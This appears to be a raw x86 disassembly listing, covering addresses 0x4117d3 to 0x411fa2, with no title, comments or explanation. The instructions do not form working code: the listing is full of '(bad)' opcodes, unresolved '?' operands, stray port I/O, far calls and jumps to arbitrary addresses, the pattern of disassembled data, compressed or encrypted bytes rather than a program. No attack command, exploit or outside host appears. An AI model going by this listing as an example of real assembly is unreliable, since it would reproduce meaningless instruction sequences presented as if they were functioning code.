  4117d3:	int3   
  4117d4:	inc    edi
  4117d5:	inc    esp
  4117d6:	loop   0x411831
  4117d8:	cmc    
  4117d9:	pop    edi
  4117da:	fidivr WORD PTR [esi]
  4117dc:	inc    esp
  4117dd:	mov    ch,0xb8
  4117df:	mov    ebx,0xe0e5e27e
  4117e4:	mov    al,ds:0xbd8b63e2
  4117e9:	retf   0x6c22
  4117ec:	mov    ds:0xcdd48074,al
  4117f1:	repz ror DWORD PTR [eax-0x75a2cf98],1
  4117f8:	mov    ecx,0x4c5defd3
  4117fd:	mov    al,0x45
  4117ff:	mov    es:0xca3d7c0a,al
  411805:	sub    bl,BYTE PTR [esi-0x12]
  411808:	in     al,dx
  411809:	mov    esp,0x6891f415
  41180e:	popa   
  41180f:	pop    ebp
  411810:	cmp    esi,DWORD PTR [ebx-0xc]
  411813:	stos   DWORD PTR es:[edi],eax
  411814:	sub    eax,0x22e35c32
  411819:	push   ebx
  41181a:	out    0x40,eax
  41181c:	fcom   DWORD PTR [ebp-0x17]
  41181f:	jl     0x4117f5
  411821:	(bad)  
  411822:	rcl    al,cl
  411824:	xchg   ebp,eax
  411825:	and    eax,0xa7695dfd
  41182a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41182b:	enter  0x1620,0x80
  41182f:	xchg   esp,eax
  411830:	inc    ecx
  411831:	xor    edx,0x6c1b392a
  411837:	and    DWORD PTR [ebp+0x25d92091],ebp
  41183d:	nop
  41183e:	or     al,BYTE PTR [ecx+0x48]
  411841:	pop    esp
  411842:	fwait
  411843:	out    0xf9,al
  411845:	std    
  411846:	in     eax,0xa5
  411848:	dec    edi
  411849:	xchg   ecx,eax
  41184a:	push   edi
  41184b:	cwde   
  41184c:	mov    cl,0x38
  41184e:	es mov bh,0x18
  411851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411852:	xor    BYTE PTR [ebx+0x21],bl
  411855:	push   esp
  411856:	ja     0x411820
  411858:	dec    edi
  411859:	repnz inc esp
  41185b:	fwait
  41185c:	pusha  
  41185d:	cs loopne 0x41183d
  411860:	pop    ds
  411861:	pop    ds
  411862:	cdq    
  411863:	fsubr  DWORD PTR [edx-0x79ae3736]
  411869:	aaa    
  41186a:	jmp    0x29761ae1
  41186f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411870:	lock fucomi st,st(4)
  411873:	ja     0x41183a
  411875:	das    
  411876:	lock stos DWORD PTR es:[edi],eax
  411878:	pop    es
  411879:	push   0x3ae3ecf1
  41187e:	adc    BYTE PTR [esi-0x25],0xc7
  411882:	bsf    edi,edx
  411885:	mov    WORD PTR [eax+0x35],gs
  411888:	adc    edi,ecx
  41188a:	dec    esi
  41188b:	pop    ebx
  41188c:	outs   dx,BYTE PTR ds:[esi]
  41188d:	xor    bh,BYTE PTR [ebp-0x10]
  411890:	stos   DWORD PTR es:[edi],eax
  411891:	xchg   al,dl
  411893:	mov    WORD PTR [edi+ebp*2-0x7e],?
  411897:	push   ds
  411898:	cmp    eax,0x39878b64
  41189d:	shl    DWORD PTR [esi-0x3cac61a5],1
  4118a3:	test   BYTE PTR [edx-0x32],0xa6
  4118a7:	out    dx,al
  4118a8:	aad    0x8
  4118aa:	sbb    al,0x3
  4118ac:	retf   0x45c1
  4118af:	dec    ebp
  4118b0:	mov    BYTE PTR [esi+edx*4-0x36df7a96],dl
  4118b7:	call   DWORD PTR [eax+0x35]
  4118ba:	xor    al,0xc9
  4118bc:	jle    0x4118e0
  4118be:	(bad)
  4118c1:	sub    al,0x5f
  4118c3:	push   es
  4118c4:	sbb    BYTE PTR [si],al
  4118c7:	xor    ebp,0x6f
  4118ca:	ret    
  4118cb:	mov    ebp,0xac3c6f0f
  4118d0:	rcr    BYTE PTR [edx],0x27
  4118d3:	data16 fwait
  4118d5:	xchg   DWORD PTR [ecx],esi
  4118d7:	mov    cl,0xf2
  4118d9:	cmp    edx,DWORD PTR [eax-0x3b]
  4118dc:	jns    0x411875
  4118de:	xchg   ebp,eax
  4118df:	test   DWORD PTR [ebx],0x9c01a2ce
  4118e5:	pop    es
  4118e6:	push   ds
  4118e7:	ja     0x4118af
  4118e9:	mov    esp,0xc0da91b1
  4118ee:	test   eax,0xc9106873
  4118f3:	fs enter 0x6df2,0x79
  4118f8:	icebp  
  4118f9:	lahf   
  4118fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118fb:	push   edi
  4118fc:	inc    eax
  4118fd:	dec    eax
  4118ff:	loope  0x411946
  411901:	mov    bh,0x65
  411903:	jb     0x4118cf
  411905:	push   0xffffffc8
  411907:	cmp    ebx,edi
  411909:	sbb    BYTE PTR [edi],0xe5
  41190c:	out    dx,al
  41190d:	push   esi
  41190e:	call   0xd8f83326
  411913:	fisubr DWORD PTR [esi]
  411915:	aam    0xae
  411917:	fyl2xp1 
  411919:	js     0x4118bf
  41191b:	aad    0x5d
  41191d:	cmc    
  41191e:	inc    ebx
  41191f:	xchg   ecx,eax
  411920:	setle  BYTE PTR [esp+esi*1]
  411924:	stc    
  411925:	push   0xffffffb0
  411927:	jnp    0x411918
  411929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192a:	and    ebx,DWORD PTR [edx-0x2d]
  41192d:	loope  0x4118ba
  41192f:	pop    edi
  411930:	jecxz  0x4118fa
  411932:	pop    es
  411933:	int3   
  411934:	xchg   esp,eax
  411935:	loop   0x411950
  411937:	dec    edi
  411938:	imul   ecx,esp,0x3f38d550
  41193e:	jne    0x411926
  411940:	cmp    eax,0xffffffad
  411943:	imul   esp,ecx,0x80d60b45
  411949:	in     al,0xa4
  41194b:	dec    eax
  41194c:	aad    0x3d
  41194e:	cwde   
  41194f:	out    dx,eax
  411950:	jae    0x411968
  411952:	shl    esi,cl
  411954:	adc    ecx,0xfffffffd
  411957:	dec    ecx
  411958:	cmp    DWORD PTR [ebx],0xde55a5db
  41195e:	xchg   edi,eax
  41195f:	pusha  
  411960:	cmc    
  411961:	loope  0x411923
  411963:	and    esp,DWORD PTR [ebx]
  411965:	jb     0x411954
  411967:	mov    edx,0x74e33a85
  41196c:	jnp    0x411904
  41196e:	outs   dx,DWORD PTR ds:[esi]
  41196f:	dec    ebx
  411970:	and    al,0xf
  411972:	repz push ss
  411974:	cmp    al,0x47
  411976:	push   0xfca818f0
  41197b:	inc    ebx
  41197c:	loop   0x411932
  41197e:	ret    0xa06a
  411981:	call   0x7d66:0x5bbab534
  411988:	ror    BYTE PTR [eax],0xa0
  41198b:	(bad)  
  41198c:	pop    esp
  41198d:	sbb    dh,al
  41198f:	add    al,0xc1
  411991:	fwait
  411992:	addr16 xchg esi,eax
  411994:	gs adc al,0x55
  411997:	sahf   
  411998:	jp     0x411984
  41199a:	xchg   ecx,eax
  41199b:	xchg   BYTE PTR [ebp-0x40],cl
  41199e:	stos   BYTE PTR es:[edi],al
  41199f:	jnp    0x4119f0
  4119a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a2:	outs   dx,DWORD PTR ds:[esi]
  4119a3:	and    edx,ebx
  4119a5:	fstp   TBYTE PTR [ecx-0x5a]
  4119a8:	(bad)  
  4119a9:	test   DWORD PTR ds:0xacec49ef,esp
  4119af:	jmp    0x6ed7562e
  4119b4:	xor    eax,0xcdbbe4d2
  4119b9:	mov    ?,ecx
  4119bb:	fs mov ebx,0x30e108c8
  4119c1:	hlt    
  4119c2:	jo     0x411944
  4119c4:	in     al,dx
  4119c5:	imul   esp,DWORD PTR [esp+ecx*2-0x53b24ef1]
  4119cd:	fstp   TBYTE PTR [ecx+0x36]
  4119d0:	fwait
  4119d1:	jne    0x4119e1
  4119d3:	or     edx,DWORD PTR [ecx+0x2c]
  4119d6:	pop    edi
  4119d7:	sahf   
  4119d8:	lods   eax,DWORD PTR ds:[esi]
  4119d9:	fsub   QWORD PTR [esi+0x2f2a107]
  4119df:	sub    eax,0x70d470e0
  4119e4:	dec    eax
  4119e5:	js     0x411a32
  4119e7:	ins    BYTE PTR es:[edi],dx
  4119e8:	dec    eax
  4119e9:	rol    BYTE PTR ds:0x6d13a585,0x64
  4119f0:	sbb    edx,ecx
  4119f2:	clc    
  4119f3:	shl    esi,1
  4119f5:	add    BYTE PTR ds:0x81127304,0xf6
  4119fc:	pop    edi
  4119fd:	and    ah,ch
  4119ff:	(bad)  
  411a00:	jmp    0x60046c0a
  411a05:	lea    edi,[ebp+0x50]
  411a08:	dec    ebx
  411a09:	inc    ebp
  411a0a:	(bad)  
  411a0b:	gs cli 
  411a0d:	sbb    al,0x7e
  411a0f:	push   eax
  411a10:	aaa    
  411a11:	mov    WORD PTR [edx-0x3a],?
  411a14:	mov    eax,0xcb81db0e
  411a19:	xor    DWORD PTR [ebx+0x79],ecx
  411a1c:	test   BYTE PTR [ebp-0x49168e7f],dl
  411a22:	ror    ah,0x16
  411a25:	inc    ebp
  411a26:	cwde   
  411a27:	mov    edi,0x7e2805b1
  411a2c:	ret    
  411a2d:	ins    BYTE PTR es:[edi],dx
  411a2e:	mov    ch,0x92
  411a30:	arpl   di,ax
  411a32:	push   ds
  411a33:	or     DWORD PTR [edi+0x6c],esi
  411a36:	ds popa 
  411a38:	loopne 0x411a77
  411a3a:	cmp    DWORD PTR [ecx+0x6c],edx
  411a3d:	cdq    
  411a3e:	aas    
  411a3f:	xchg   ebp,eax
  411a40:	enter  0x92da,0x68
  411a44:	(bad)  
  411a45:	mov    dh,0x55
  411a47:	sti    
  411a48:	icebp  
  411a49:	xor    esp,esi
  411a4b:	frstor [eax]
  411a4d:	sbb    ecx,esi
  411a4f:	add    eax,0x483d0c90
  411a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a55:	mov    ds:0x9880e990,al
  411a5a:	ins    DWORD PTR es:[edi],dx
  411a5b:	mov    dl,0xcb
  411a5d:	push   esp
  411a5e:	xlat   BYTE PTR ds:[ebx]
  411a5f:	push   eax
  411a60:	cmp    DWORD PTR ds:0xd027ade,esi
  411a66:	dec    eax
  411a67:	mov    ah,0xee
  411a69:	xchg   esi,eax
  411a6a:	in     al,0xc9
  411a6c:	jne    0x411a24
  411a6e:	mov    eax,ds:0xae95a6bf
  411a73:	aad    0xd6
  411a75:	push   eax
  411a76:	push   ebx
  411a77:	jbe    0x411aec
  411a79:	out    0xe4,al
  411a7b:	push   edi
  411a7c:	push   esi
  411a7d:	jmp    0x49ae933b
  411a82:	add    eax,0xabba6e25
  411a87:	push   cs
  411a88:	inc    edx
  411a89:	inc    edi
  411a8a:	sub    DWORD PTR [edx],eax
  411a8c:	cmp    ebp,ebp
  411a8e:	(bad)  
  411a8f:	jge    0x411aab
  411a91:	jle    0x411b0b
  411a93:	mov    cl,0x2a
  411a95:	sub    DWORD PTR [ecx-0x46],edx
  411a98:	pop    ss
  411a99:	and    BYTE PTR [edi],dl
  411a9b:	out    0x86,al
  411a9d:	call   0x38edf40e
  411aa2:	test   BYTE PTR cs:[esi],bl
  411aa5:	jecxz  0x411a76
  411aa7:	lods   eax,DWORD PTR ds:[esi]
  411aa8:	fwait
  411aa9:	and    eax,0x2200aee5
  411aae:	cmp    eax,DWORD PTR [esi+0x1baed6bc]
  411ab4:	lods   al,BYTE PTR ds:[esi]
  411ab5:	push   ebx
  411ab6:	les    ebx,FWORD PTR [ecx]
  411ab8:	int3   
  411ab9:	in     eax,dx
  411aba:	rol    BYTE PTR [ebx+ecx*4+0x10],0xcc
  411abf:	mov    eax,ebp
  411ac1:	inc    eax
  411ac2:	push   edx
  411ac3:	icebp  
  411ac4:	jmp    0xb3a099a9
  411ac9:	call   0x15e817a
  411ace:	push   es
  411acf:	pop    esp
  411ad0:	or     eax,0xa9eb1bef
  411ad5:	div    BYTE PTR [eax+0x62c69162]
  411adb:	mov    cl,0x50
  411add:	inc    esi
  411ade:	ret    0x3fa4
  411ae1:	sbb    cl,BYTE PTR [eax+ebp*1]
  411ae4:	scas   al,BYTE PTR es:[edi]
  411ae5:	jp     0x411ac7
  411ae7:	cmp    bh,BYTE PTR [ebp-0x52008510]
  411aed:	mov    dl,0xec
  411aef:	and    cl,0x5
  411af2:	xchg   ecx,eax
  411af3:	lahf   
  411af4:	jb     0x411abe
  411af6:	arpl   ax,ax
  411af8:	fstp   st(0)
  411afa:	aam    0x52
  411afc:	pop    ds
  411afd:	mov    eax,ds:0x56282a54
  411b02:	add    dh,BYTE PTR [edi-0x6883c4bc]
  411b08:	cs dec ecx
  411b0a:	pop    edi
  411b0b:	inc    eax
  411b0c:	hlt    
  411b0d:	fs inc esi
  411b0f:	xor    al,0xd3
  411b11:	push   0xdb506f3d
  411b16:	enter  0x400e,0xb2
  411b1a:	popa   
  411b1b:	shr    DWORD PTR [esi],cl
  411b1d:	mov    esi,0xc2298804
  411b22:	mov    cs,WORD PTR ds:0x8598f2f8
  411b28:	push   edx
  411b29:	je     0x411b1f
  411b2b:	cmp    dl,cl
  411b2d:	test   ah,ah
  411b2f:	push   ss
  411b30:	ins    BYTE PTR es:[edi],dx
  411b31:	lods   al,BYTE PTR ds:[esi]
  411b32:	push   edx
  411b33:	daa    
  411b34:	inc    ebx
  411b35:	je     0x411ad9
  411b37:	pop    esp
  411b38:	push   DWORD PTR [edx]
  411b3a:	imul   ebx,DWORD PTR [eax+0x52],0xffffffbb
  411b3e:	pushf  
  411b3f:	or     eax,0xc086b0dd
  411b44:	icebp  
  411b45:	aas    
  411b46:	rcr    DWORD PTR [esi-0xc],1
  411b49:	stc    
  411b4a:	cwde   
  411b4b:	cmp    eax,0xa550994d
  411b50:	repz je 0x411b2a
  411b53:	cmp    edi,esp
  411b55:	mov    BYTE PTR [edx+0x13],0x33
  411b59:	pop    es
  411b5a:	jno    0x411b49
  411b5c:	test   eax,0xead7c373
  411b61:	sbb    al,0x7d
  411b63:	lods   al,BYTE PTR ds:[esi]
  411b64:	loop   0x411bc6
  411b66:	enter  0x96b2,0x27
  411b6a:	clc    
  411b6b:	inc    esi
  411b6c:	or     BYTE PTR [edx+0x75090dee],ch
  411b72:	mov    dl,0xb0
  411b74:	ret    
  411b75:	mov    ebx,0xc5d86b39
  411b7a:	pop    edx
  411b7b:	push   ecx
  411b7c:	sahf   
  411b7d:	inc    ebp
  411b7e:	leave  
  411b7f:	inc    edi
  411b80:	mov    eax,ds:0x2cd0f22f
  411b85:	stos   BYTE PTR es:[edi],al
  411b86:	aam    0xcd
  411b88:	test   al,0x32
  411b8a:	leave  
  411b8b:	or     eax,0xa1d25dbc
  411b90:	add    al,0x25
  411b92:	ss sbb eax,0x4fab93d9
  411b98:	int    0x27
  411b9a:	ficom  DWORD PTR [ebp-0x19]
  411b9d:	lods   al,BYTE PTR ds:[esi]
  411b9e:	ja     0x411b50
  411ba0:	retf   0x967d
  411ba3:	in     eax,0x8a
  411ba5:	pop    ebp
  411ba6:	repnz pop ebp
  411ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba9:	cmp    BYTE PTR [edi+0x64],al
  411bac:	push   ecx
  411bad:	push   esi
  411bae:	cld    
  411baf:	dec    esi
  411bb0:	stos   DWORD PTR es:[edi],eax
  411bb1:	pop    edx
  411bb2:	aad    0xe
  411bb4:	mov    DWORD PTR [ebp+ebx*4-0x67],esp
  411bb8:	jl     0x411b74
  411bba:	out    0xe6,eax
  411bbc:	ss daa 
  411bbe:	es xchg ebp,eax
  411bc0:	adc    BYTE PTR [edx-0x35],cl
  411bc3:	stc    
  411bc4:	jno    0x411bbb
  411bc6:	add    bl,BYTE PTR [ecx+0x7265f7ca]
  411bcc:	cmp    BYTE PTR [edx-0xb],dl
  411bcf:	jmp    0xa2bff978
  411bd4:	jnp    0x411c31
  411bd6:	push   esp
  411bd7:	je     0x411be8
  411bd9:	mov    esp,0x95bef782
  411bde:	mov    ebx,0x7dec3624
  411be3:	test   DWORD PTR [ebx-0x67],ebx
  411be6:	push   edx
  411be7:	sbb    DWORD PTR [ecx-0x7],ebp
  411bea:	xor    cl,BYTE PTR [eax+eax*8-0x4f4c7076]
  411bf1:	cwde   
  411bf2:	cmp    eax,0xfb94d7d3
  411bf7:	push   0x64711f38
  411bfc:	inc    eax
  411bfd:	xchg   al,bl
  411bff:	push   esi
  411c00:	call   0x726e:0x3eac1900
  411c07:	fs and al,0xa2
  411c0a:	imul   edx
  411c0c:	push   ebx
  411c0d:	cli    
  411c0e:	sub    eax,0x447c906d
  411c13:	pop    es
  411c14:	push   ds
  411c15:	push   edx
  411c16:	jle    0x411c66
  411c18:	cmc    
  411c19:	rcl    esi,1
  411c1b:	add    eax,0xc00d66a3
  411c20:	mov    ah,0x46
  411c22:	mov    edx,0xbc5d7e9c
  411c27:	fsubr  QWORD PTR [eax+0x78]
  411c2a:	xchg   esp,eax
  411c2b:	out    0x75,eax
  411c2d:	xor    BYTE PTR [edx],al
  411c2f:	rol    BYTE PTR [eax],1
  411c31:	shl    BYTE PTR [edx-0x6a78eb0f],0x32
  411c38:	lods   al,BYTE PTR ds:[esi]
  411c39:	sbb    esp,DWORD PTR [ecx]
  411c3b:	push   cs
  411c3c:	lock pop es
  411c3e:	call   0xb2e3:0x9b86c09e
  411c45:	cmc    
  411c46:	sar    DWORD PTR cs:[edx],0x53
  411c4a:	mov    dh,0x60
  411c4c:	mov    edi,DWORD PTR [edi+0x58]
  411c4f:	(bad)  
  411c50:	or     eax,0x8273e77
  411c55:	sbb    BYTE PTR [edx],ch
  411c57:	(bad)  
  411c59:	shr    DWORD PTR [edi-0x7c0a200b],1
  411c5f:	inc    edi
  411c60:	dec    esi
  411c61:	mov    ebp,0xe322d213
  411c66:	sbb    ch,BYTE PTR [edx]
  411c68:	mov    ds,WORD PTR [eax]
  411c6a:	lea    ebx,[eax-0x4b]
  411c6d:	into   
  411c6e:	ins    DWORD PTR es:[edi],dx
  411c6f:	mov    BYTE PTR [eax+ecx*1-0x62],cl
  411c73:	or     esi,DWORD PTR [edi]
  411c75:	jle    0x411c63
  411c77:	pop    sp
  411c79:	shr    BYTE PTR ds:0xdd356b4e,cl
  411c7f:	fld    QWORD PTR [esi+eax*8+0x54]
  411c83:	outs   dx,BYTE PTR ds:[esi]
  411c84:	add    eax,DWORD PTR ds:0x92a95730
  411c8a:	fwait
  411c8b:	jmp    FWORD PTR [edi+0x6768954b]
  411c91:	in     eax,dx
  411c92:	fimul  DWORD PTR [ebx-0x29]
  411c95:	imul   edi,edi,0x1c
  411c98:	lahf   
  411c99:	sbb    DWORD PTR [ebp+0x42],0xffffffa1
  411c9d:	fstp   QWORD PTR [esi]
  411c9f:	stos   BYTE PTR es:[edi],al
  411ca0:	pusha  
  411ca1:	stc    
  411ca2:	inc    esi
  411ca3:	mov    dh,BYTE PTR [esi-0x54217ffa]
  411ca9:	pop    ebx
  411caa:	dec    edx
  411cab:	(bad)  
  411cac:	push   ecx
  411cad:	and    DWORD PTR ds:0xff8a3bcb,edi
  411cb3:	lock fisubr DWORD PTR ds:0x259c7f61
  411cba:	mov    ah,0x47
  411cbc:	out    0xb3,eax
  411cbe:	sar    DWORD PTR [esi-0x3b],1
  411cc1:	(bad)  ds:[edi]
  411cc4:	mov    edi,0x76e77e88
  411cc9:	sub    ah,al
  411ccb:	fldcw  WORD PTR [ebx+edi*8+0x28]
  411ccf:	punpckhdq mm0,mm3
  411cd2:	xchg   ecx,eax
  411cd3:	daa    
  411cd4:	add    ch,0xc3
  411cd7:	push   ecx
  411cd8:	icebp  
  411cd9:	fcomp  QWORD PTR [ebx]
  411cdb:	rol    DWORD PTR [esi+0x44],1
  411cde:	test   dh,cl
  411ce0:	dec    ecx
  411ce1:	shl    BYTE PTR [edi+eax*1],0xd8
  411ce5:	and    edx,0xffffff85
  411ce8:	leave  
  411ce9:	adc    DWORD PTR [ecx],ecx
  411ceb:	xchg   ebx,eax
  411cec:	cs mov ebx,0x28772263
  411cf2:	mov    edx,0x83251582
  411cf7:	mov    BYTE PTR [ebx-0x5251f366],ch
  411cfd:	jmp    0x10ee:0x1d9c01
  411d04:	retf   
  411d05:	shl    dh,0xa7
  411d08:	pop    edi
  411d09:	sub    BYTE PTR [eax-0x74],ch
  411d0c:	add    ah,BYTE PTR [ebp+0x2b]
  411d0f:	aas    
  411d10:	inc    esp
  411d11:	pop    esi
  411d12:	icebp  
  411d13:	test   BYTE PTR [eax],dl
  411d15:	pop    edx
  411d16:	in     eax,0xa5
  411d18:	(bad)
  411d1b:	jmp    0x45589400
  411d20:	call   0x30f9e3bd
  411d25:	js     0x411cc7
  411d27:	popf   
  411d28:	std    
  411d29:	(bad)  
  411d2a:	ss sti 
  411d2c:	mov    esi,0xfde6f6e9
  411d31:	sub    ecx,esp
  411d33:	loope  0x411d8f
  411d35:	or     esi,edi
  411d37:	sar    BYTE PTR [ecx+eiz*2],cl
  411d3a:	pop    ecx
  411d3b:	int    0x39
  411d3d:	in     al,dx
  411d3e:	add    ecx,esp
  411d40:	cmc    
  411d41:	mov    eax,0xf009b545
  411d46:	pop    esi
  411d47:	xor    esp,DWORD PTR [ebx]
  411d49:	jp     0x411d78
  411d4b:	push   ds
  411d4c:	push   ds
  411d4d:	mov    DWORD PTR [ecx-0x2df7e596],ebx
  411d53:	retf   0x90b
  411d56:	(bad)  
  411d57:	stc    
  411d58:	adc    cl,cl
  411d5a:	jp     0x411d55
  411d5c:	pop    esi
  411d5d:	and    BYTE PTR [edx-0x4f],dl
  411d60:	adc    bh,0xad
  411d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d64:	loope  0x411d38
  411d66:	fldpi  
  411d68:	xchg   edi,edx
  411d6a:	dec    eax
  411d6b:	ret    0x941c
  411d6e:	gs inc esp
  411d70:	loope  0x411daa
  411d72:	push   esi
  411d73:	sbb    al,0x13
  411d75:	push   esp
  411d76:	mov    al,ds:0x92d7abd
  411d7b:	leave  
  411d7c:	hlt    
  411d7d:	retf   
  411d7e:	add    ecx,0xfffffff6
  411d81:	push   ecx
  411d82:	arpl   WORD PTR [esi+0x16dfe480],dx
  411d88:	mov    ecx,0x39b42b1b
  411d8d:	call   0xa346cb5f
  411d92:	and    al,0xc8
  411d94:	xchg   ebx,eax
  411d95:	out    0xd6,eax
  411d97:	xchg   ebp,eax
  411d98:	xor    bl,al
  411d9a:	jmp    0x411daa
  411d9c:	sbb    BYTE PTR [edi+0x65],cl
  411d9f:	xor    DWORD PTR [edx-0x6e],ebp
  411da2:	lods   al,BYTE PTR ds:[esi]
  411da3:	pop    esp
  411da4:	clc    
  411da5:	dec    ebp
  411da6:	pusha  
  411da7:	dec    ebp
  411da8:	mov    ebp,0x9ca1bfc7
  411dad:	push   ebx
  411dae:	xchg   ebp,eax
  411daf:	xor    eax,0x1107bef
  411db4:	jbe    0x411e1d
  411db6:	sub    BYTE PTR [ecx-0x1e45dffe],ch
  411dbc:	retf   0x85c5
  411dbf:	imul   ebp,edx,0xffffffd5
  411dc2:	mov    ebx,0x79889eb2
  411dc7:	fwait
  411dc8:	shr    DWORD PTR [ebx-0x7403029c],0x21
  411dcf:	pop    ds
  411dd0:	sub    bh,BYTE PTR [ebp+0x4f4074ba]
  411dd6:	inc    ebx
  411dd7:	ret    0xe4ab
  411dda:	(bad)  [eax+0x3b967a1]
  411de0:	and    cl,BYTE PTR [esi+0x39cce260]
  411de6:	push   eax
  411de7:	mov    es,WORD PTR [eax-0x16eb8446]
  411ded:	test   eax,0xe7d770a7
  411df2:	stos   BYTE PTR es:[edi],al
  411df3:	pop    edx
  411df4:	call   0x7b8:0xac7aadaa
  411dfb:	repz mov al,0xff
  411dfe:	xchg   esp,eax
  411dff:	sub    al,0x8a
  411e01:	sub    al,0x4d
  411e03:	mov    al,0xb2
  411e05:	jns    0x411dae
  411e07:	xchg   BYTE PTR [ebx-0x72],bh
  411e0a:	sub    BYTE PTR [eax+0x30fe34a5],dh
  411e10:	and    eax,0x92f6539d
  411e15:	rcl    BYTE PTR [edx-0x11ee86a6],cl
  411e1b:	rcl    BYTE PTR [ebx],cl
  411e1d:	js     0x411dc7
  411e1f:	mov    edx,0x76538034
  411e24:	and    DWORD PTR [ebx+0x67a90aa2],edi
  411e2a:	adc    ecx,ecx
  411e2c:	aaa    
  411e2d:	imul   edx,esp,0x8138f33e
  411e33:	cmp    dl,al
  411e35:	push   ebp
  411e36:	inc    ebx
  411e37:	inc    esp
  411e38:	bnd ret 
  411e3a:	mov    dh,0x4c
  411e3c:	push   edi
  411e3d:	inc    esp
  411e3e:	xor    al,0xb4
  411e40:	dec    ebx
  411e41:	mov    ds:0xc81dfa9c,al
  411e46:	retf   
  411e47:	lahf   
  411e48:	add    DWORD PTR [ebp+0x63137129],ebx
  411e4e:	sub    eax,DWORD PTR [ebx-0x6e]
  411e51:	mov    esi,0xf49fbd5e
  411e56:	(bad)  
  411e57:	add    eax,0x348a8fc3
  411e5c:	cmp    al,0x2c
  411e5e:	sar    DWORD PTR [ecx+ebx*2],0xc1
  411e62:	pop    ebp
  411e63:	jae    0x411e10
  411e65:	inc    esi
  411e66:	and    dl,BYTE PTR [ecx+0x1ae432ad]
  411e6c:	inc    ecx
  411e6d:	and    cl,BYTE PTR [ecx-0x48b50f42]
  411e73:	jl     0x411e6d
  411e75:	xchg   esi,eax
  411e76:	xchg   edi,eax
  411e77:	js     0x411e82
  411e79:	pop    ds
  411e7a:	sub    ebp,0xffffff9b
  411e7d:	jp     0x411e8e
  411e7f:	pop    ebp
  411e80:	push   ebx
  411e81:	iret   
  411e82:	mov    ds,esp
  411e84:	inc    eax
  411e85:	jecxz  0x411e97
  411e87:	fcmovb st,st(5)
  411e89:	push   ds
  411e8a:	int3   
  411e8b:	in     al,0xc9
  411e8d:	fs or  al,0x9f
  411e90:	fdivr  QWORD PTR [eax+0x33]
  411e93:	popf   
  411e94:	test   BYTE PTR [edi+0x20a6a798],0xfa
  411e9b:	cli    
  411e9c:	pusha  
  411e9d:	das    
  411e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9f:	mov    cl,0xd0
  411ea1:	push   edi
  411ea2:	and    DWORD PTR [ebx-0x11d94cc7],ebp
  411ea8:	inc    ecx
  411ea9:	pop    edi
  411eaa:	mov    bh,0x9e
  411eac:	rcr    ebp,cl
  411eae:	mov    ecx,0xd7ddd692
  411eb3:	jle    0x411f2b
  411eb5:	hlt    
  411eb6:	aas    
  411eb7:	sub    eax,0x3bf5d272
  411ebc:	fwait
  411ebd:	sub    bh,BYTE PTR [eax+0x53]
  411ec0:	sti    
  411ec1:	ret    
  411ec2:	sub    BYTE PTR ds:0xdeb8179,0x25
  411ec9:	and    ah,dh
  411ecb:	(bad)  
  411ecc:	es mov dh,0x6b
  411ecf:	pop    ebp
  411ed0:	fst    DWORD PTR [esp+ecx*8]
  411ed3:	lds    ecx,FWORD PTR [edx-0x78]
  411ed6:	clc    
  411ed7:	imul   ecx,DWORD PTR [edx-0x26],0x5951b51
  411ede:	mov    ch,0x57
  411ee0:	in     al,dx
  411ee1:	jp     0x411f47
  411ee3:	cld    
  411ee4:	(bad)  
  411ee5:	in     eax,dx
  411ee6:	sub    al,0x81
  411ee8:	repz adc eax,0x9d3ba82e
  411eee:	fdiv   st(3),st
  411ef0:	popf   
  411ef1:	and    ebp,ecx
  411ef3:	inc    ecx
  411ef4:	add    al,0x40
  411ef6:	push   esi
  411ef7:	xor    eax,0x8dee77f1
  411efc:	xchg   ebx,eax
  411efd:	lock (bad) 
  411eff:	fmul   st,st(6)
  411f01:	fist   DWORD PTR [edx+ebp*2-0x629097d2]
  411f08:	mov    eax,0xc3663fe9
  411f0d:	ja     0x411e94
  411f0f:	in     eax,dx
  411f10:	(bad)  
  411f11:	mov    eax,0x4c44eb7
  411f16:	pop    ebx
  411f17:	leave  
  411f18:	xchg   ebp,eax
  411f19:	inc    ebp
  411f1a:	mov    edi,0x783d1faa
  411f1f:	lock std 
  411f21:	into   
  411f22:	cmc    
  411f23:	jns    0x411eb3
  411f25:	push   edx
  411f26:	pop    ds
  411f27:	repz pop ss
  411f29:	ins    BYTE PTR es:[edi],dx
  411f2a:	mov    ecx,0x1de1feeb
  411f2f:	sbb    eax,0xebb4df41
  411f34:	jl     0x411f62
  411f36:	sub    esi,edi
  411f38:	into   
  411f39:	jo     0x411f4c
  411f3b:	jl     0x411f9c
  411f3d:	and    dl,al
  411f3f:	mov    dh,0xc1
  411f41:	js     0x411ee8
  411f43:	sbb    eax,0x444272e7
  411f48:	mov    ecx,0xad66812d
  411f4d:	loope  0x411f29
  411f4f:	mov    WORD PTR [ebp+0x4a1343c3],?
  411f55:	popf   
  411f56:	push   esp
  411f57:	aam    0x67
  411f59:	pop    ebp
  411f5a:	ds push 0x39
  411f5d:	cmc    
  411f5e:	imul   esp,DWORD PTR [esi+0x35a7f279],0xb
  411f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f66:	in     eax,dx
  411f67:	in     al,0xff
  411f69:	nop
  411f6a:	push   ebp
  411f6b:	out    dx,al
  411f6c:	shr    BYTE PTR [esi+0x52fbca89],1
  411f72:	or     bl,BYTE PTR [edi-0x41]
  411f75:	pushf  
  411f76:	push   ds
  411f77:	push   esp
  411f78:	fdivr  QWORD PTR [ebx-0x6c]
  411f7b:	aad    0x34
  411f7d:	sahf   
  411f7e:	jnp    0x411f09
  411f80:	ss xor eax,0x401a1336
  411f86:	adc    al,0x88
  411f88:	rcr    DWORD PTR [edi-0x7f],cl
  411f8b:	lea    ebp,[edi-0x2ed1932b]
  411f91:	xor    dl,0xca
  411f94:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  411f96:	imul   esp,DWORD PTR [ecx-0x5f],0xd46edbb6
  411f9d:	push   0x72e33bcb
  411fa2:	cmp    al,BYTE PTR [esi+0x6b]
